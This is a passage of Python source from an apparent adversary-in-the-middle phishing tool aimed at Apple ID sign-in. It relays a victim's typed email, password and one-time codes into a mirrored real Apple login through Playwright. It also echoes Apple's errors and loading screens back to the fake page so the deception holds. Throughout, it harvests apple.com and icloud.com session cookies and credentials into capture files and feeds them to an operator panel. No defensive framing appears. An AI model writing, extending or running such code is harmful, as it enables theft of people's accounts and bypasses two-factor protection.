                    and desired_route in ('/payment', '/flow', '/session', '/loading', '/success')
                    and victim_path_effective() != desired_route
                    and route_rank(desired_route) >= route_rank(last_route)
                    and not awaiting_apple_path
                ):
                    awaiting_apple_path = desired_route
                    victim_eval(
                        victim,
                        "() => window.HarborDriver && window.HarborDriver.setMirrorLoading(true)",
                    )

                if last_route == '/signin':
                    if (
                        allow_password_ui
                        and not victim_password_ui_applied
                        and (
                            (apple_state and apple_state.get('step') == 'password')
                            or apple_password_step_ready(frame)
                        )
                    ):
                        st = dict(apple_state or {})
                        st['step'] = 'password'
                        sync_victim_signin_from_apple(
                            victim,
                            st,
                            credentials,
                            allow_password=True,
                            remote=args.remote,
                        )
                        victim_password_ui_applied = True
                    elif not allow_password_ui:
                        on_pw = victim_knows_password_step(
                            victim, victim_password_ui_applied
                        )
                        if (
                            not on_pw
                            and not pending_password_until
                            and not apple_password_step_ready(frame)
                        ):
                            sync_victim_signin_from_apple(
                                victim,
                                apple_state,
                                credentials,
                                allow_password=False,
                                remote=args.remote,
                            )
                    elif not (apple_state and apple_state.get('loading')):
                        victim_eval(
                            victim,
                            "() => window.PhishBridge && window.PhishBridge.setLoading(false)",
                        )
                    errors = (apple_state or {}).get('errors') or []
                    if errors:
                        msg = pick_apple_error(errors)
                        err_key = hashlib.sha256(msg.encode()).hexdigest()[:16]
                        if err_key != last_error_key:
                            inv = invalidate_for_message(msg)
                            add_log(f'apple error -> victim: {msg[:70]}')
                            victim_eval(
                                victim,
                                "() => window.PhishBridge && window.PhishBridge.setLoading(false)",
                            )
                            victim_eval(
                                victim,
                                "(a) => window.HarborDriver && window.HarborDriver.showSignInError(a.msg, a.inv)",
                                {'msg': msg, 'inv': inv},
                            )
                            last_error_key = err_key
                    elif last_error_key:
                        victim_eval(victim, "() => window.HarborDriver && window.HarborDriver.clearSignInErrors()")
                        last_error_key = ''
                elif last_route == '/verify' or route_sync.commanded_path == '/verify':
                    if not args.remote and apple_otp_step_ready(frame):
                        sync_victim_verify_ui(victim, frame, credentials.get('email') or '')
                    copy = (apple_state or {}).get('verifyCopy')
                    if copy:
                        copy_key = hashlib.sha256(
                            json.dumps(copy, sort_keys=True, default=str).encode()
                        ).hexdigest()[:16]
                        if copy_key != last_verify_copy_key and not args.remote:
                            sync_victim_verify_ui(victim, frame, credentials.get('email') or '')
                            last_verify_copy_key = copy_key
                        elif copy_key != last_verify_copy_key:
                            last_verify_copy_key = copy_key
                    errors = (apple_state or {}).get('errors') or []
                    if errors:
                        msg = pick_apple_error(
                            errors,
                        ) or clean_apple_error(errors[-1])
                        err_key = 'v:' + hashlib.sha256(msg.encode()).hexdigest()[:16]
                        if err_key != last_error_key:
                            add_log(f'apple otp error -> victim: {msg[:70]}')
                            victim_eval(
                                victim,
                                "(m) => window.HarborDriver && window.HarborDriver.showVerifyError(m)",
                                msg,
                            )
                            victim_eval(victim, "() => window.PhishBridge && window.PhishBridge.stopVerifying()")
                            victim_eval(victim, "() => window.PhishBridge && window.PhishBridge.clearOtp()")
                            victim_eval(victim, "() => window.HarborDriver && window.HarborDriver.setMirrorLoading(false)")
                            last_otp = ''
                            last_apple_otp_sync = ''
                            last_error_key = err_key
                    elif last_error_key.startswith('v:'):
                        victim_eval(victim, "() => window.HarborDriver && window.HarborDriver.clearVerifyError()")
                        last_error_key = ''

                victim_path = victim_path_effective()
                otp_verifying = False
                if victim_path == '/verify':
                    try:
                        otp_verifying = bool(
                            victim.evaluate(
                                """() => {
                                  const s = document.getElementById('verify-status');
                                  return !!(s && !s.hidden);
                                }"""
                            )
                        )
                    except PlaywrightError:
                        otp_verifying = False

                want_mirror_loading = (
                    route_sync.should_block_ui(
                        apple_otp_ready=apple_otp_step_ready(frame),
                        otp_verifying=otp_verifying,
                    )
                    if args.remote
                    else should_show_mirror_loading(
                        victim_path=victim_path,
                        last_route=last_route,
                        apple_state=apple_state,
                        frame=frame,
                        surface=surface,
                        route=route,
                        pending_password_until=pending_password_until,
                        pending_verify_until=pending_verify_until,
                        mirror_loading_until=mirror_loading_until,
                        otp_verifying=otp_verifying,
                        hold_transition=hold_transition,
                    )
                )
                if want_mirror_loading != last_victim_mirror_loading and not args.remote:
                    victim_eval(
                        victim,
                        "(on) => window.HarborDriver && window.HarborDriver.setMirrorLoading(on)",
                        want_mirror_loading,
                    )
                    last_victim_mirror_loading = want_mirror_loading

                if args.remote and hasattr(victim, 'push_harbor_state'):
                    ui_state: dict = {
                        'mirrorLoading': want_mirror_loading,
                    }
                    pw_on_apple = bool(frame and apple_password_step_ready(frame))
                    on_signin = route_sync.commanded_path == '/signin'
                    show_password_ui = on_signin and pw_on_apple and (
                        allow_password_ui and victim_password_ui_applied
                    )
                    if show_password_ui:
                        ui_state['passwordStep'] = True
                        ui_state['clearSigninLoading'] = True
                        ui_state['mirrorLoading'] = False
                        em = (
                            credentials.get('email') or pending_email_account or ''
                        ).strip()
                        if em:
                            ui_state['email'] = em
                    elif time.time() < victim_signin_loading_until:
                        ui_state['signinLoading'] = True
                    if route_sync.operator_path() == '/verify' and apple_otp_step_ready(frame):
                        vc = build_verify_copy_dict(frame, credentials.get('email') or '')
                        if vc:
                            ui_state['verifyCopy'] = vc
                            ui_state['mirrorLoading'] = False
                    ui_sig = hashlib.sha256(
                        json.dumps(ui_state, sort_keys=True, default=str).encode()
                    ).hexdigest()[:16]
                    if ui_sig != last_remote_ui_sig:
                        last_remote_ui_sig = ui_sig
                        victim.push_harbor_state(ui_state)
                        last_victim_mirror_loading = bool(ui_state.get('mirrorLoading'))
                if victim_path == '/verify' and apple_otp_step_ready(frame):
                    mirror_loading_until = 0.0

                collection_tick += 1
                if collection_tick % 3 == 0:
                    run_collection_tick(
                        out_dir,
                        mirror_context,
                        frame,
                        apple,
                        apple_state,
                        page_info,
                        last_saved_keys=last_saved_keys,
                        known_fps=known_fps,
                        capture_cookies_fn=capture_cookies,
                        add_log=add_log,
                    )

                # 5) Capture Apple cookies whenever they change.
                new_cookies = capture_cookies(mirror_context)
                if new_cookies:
                    sig = cookie_signature(new_cookies)
                    if sig != last_cookie_sig:
                        last_cookie_sig = sig
                        cookies = new_cookies
                        add_log(f'captured {len(cookies)} apple.com/icloud.com cookies')
                        capture_meta = write_capture(out_dir, credentials, cookies)
                else:
                    cookies = []

                if args.remote and hasattr(victim, "flush_cmds"):
                    victim.flush_cmds(force=False)
                elif hasattr(victim, "flush_cmds"):
                    victim.flush_cmds(force=True)

                sync_live_victim_inputs_to_apple(
                    apple,
                    frame,
                    victim_typed_live,
                    apple_input_cache,
                    credentials,
                    victim_email_state,
                )
                frame = find_apple_frame(apple, frame)

                # 6) Update the operator panel.
                update_panel(panel, {
                    'status': route,
                    'credentials': credentials,
                    'cookies': [enrich_cookie_row(c) for c in cookies],
                    'session': capture_meta.get('session') or assess_session(cookies),
                    'import': capture_meta.get('import') or {},
                    'log': log[-60:],
                })

                if loop_deadline and time.time() >= loop_deadline:
                    print(f'\nRun finished ({args.run_seconds}s limit).', flush=True)
                    break

                if pending_email_account and not args.remote:
                    tick_pending_email_forward()
                time.sleep(max(args.poll_ms, 50) / 1000.0)
        except KeyboardInterrupt:
            print('\nStopped.', flush=True)
        finally:
            if args.remote:
                _release_mirror_lock(relay_listen_port, args.session)
            final_cookies = capture_cookies(mirror_context)
            if final_cookies:
                cookies = final_cookies
            capture_meta = write_capture(out_dir, credentials, cookies)
            update_panel(panel, {
                'status': last_route,
                'credentials': credentials,
                'cookies': [enrich_cookie_row(c) for c in cookies],
                'session': capture_meta.get('session') or assess_session(cookies),
                'import': capture_meta.get('import') or {},
                'log': log[-60:],
            })
            print(
                f'\nWrote {out_dir}/capture.json, storage-state.json, cookies.txt '
                f'({len(cookies)} cookies, email={credentials["email"] or "-"})',
                flush=True,
            )
            if victim_context is not None:
                victim_context.close()
            mirror_context.close()
            browser.close()

    return 0


if __name__ == '__main__':
    sys.exit(run())
